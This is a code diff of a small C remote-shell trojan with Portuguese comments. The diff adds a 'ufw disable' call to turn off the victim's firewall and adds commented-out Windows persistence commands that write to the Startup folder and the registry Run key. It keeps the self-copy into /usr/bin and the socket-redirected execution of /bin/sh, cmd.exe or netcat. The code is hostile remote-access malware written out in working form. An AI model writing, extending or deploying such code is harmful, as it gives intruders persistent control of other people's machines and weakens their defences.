@@ -2,6 +2,8 @@
 
 /* usar system() para invocar as funções do sistema! */
 
+/* usar system() para invocar as funções do sistema! */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -42,16 +44,19 @@
     }
     /* mm a for loop will be necessary, or switch case. */
 
-    send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);   /* recv(); no lado server. */
-
     dup2(x, 0),dup2(x, 1),dup2(x, 2);
     system("cp simple_shell /usr/bin"); /* here the code will execute in the target machine
                                              the following command. Will copy the software to
                                              register, on linux systems.
 
                                              Same here... */
-    system("copy /Y simple_shell.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar");
-    send(x,"\n\n[*] Copied to registry...[*]\n\n",31,0);
+    system("ufw disable");
+    //system("copy /Y simple_shell.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar");
+    //system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wopnt.exe");
+    send(x,"\n\n[*] Copied into start up [*]\n\n",32,0);
+   // send(x,"\n\n\[*] Copied into registry [*]\n\n",31,0);
+    send(x,"\n\n[*] Firewall disabled [*]\n\n",27,0);
+    send(x,"\nConnected\n",12,0),send(x,"\n\n#root > \n\n",10,0);   /* recv(); no lado server. */
     execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
 
     {
@@ -64,7 +69,7 @@
 
    /* execute the program */
 
-   int main(int argc, char *argv[])
+   int main(int argc, char **argv)
 
    {
      char option;
